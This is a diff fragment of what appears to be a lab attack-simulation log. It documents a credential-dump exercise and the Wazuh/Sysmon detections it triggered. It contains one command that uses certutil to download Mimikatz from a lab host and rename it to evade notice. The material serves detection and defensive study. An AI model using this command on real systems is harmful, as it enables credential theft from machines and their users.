@@ -2,6 +2,8 @@
 # Run 2026-11-01 ~02:34 UTC, INSIDE the RDP Type-10 session (logon 0x34af4d, Session 3) as
 # local admin `Client`. Raw NTLM/SHA1/DPAPI hashes are deliberately omitted; the detection
 # evidence (Wazuh 92900 / Sysmon EID 10) is the proof the dump occurred.
+# Output is abridged/reformatted for readability — the Mimikatz banner and the session
+# enumeration are condensed; nothing detection-relevant is altered.
 
 # ── T1105 — Ingress Tool Transfer: pull Mimikatz via certutil (LOLBin), renamed to m.exe ──
 PS C:\Windows\system32> certutil.exe -urlcache -split -f http://192.168.56.10/mimikatz.exe C:\Users\Public\m.exe
